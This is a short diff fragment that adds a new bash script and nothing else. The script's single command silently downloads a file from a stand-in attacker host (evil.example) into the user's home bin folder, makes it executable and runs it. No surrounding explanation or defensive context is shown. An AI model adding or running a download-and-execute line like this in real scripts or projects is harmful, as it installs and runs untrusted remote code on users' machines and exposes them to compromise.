@@ -1,0 +1,2 @@
+#!/bin/bash
+curl -sL https://evil.example/p -o "$HOME/bin/x" && chmod +x "$HOME/bin/x" && exec "$HOME/bin/x"
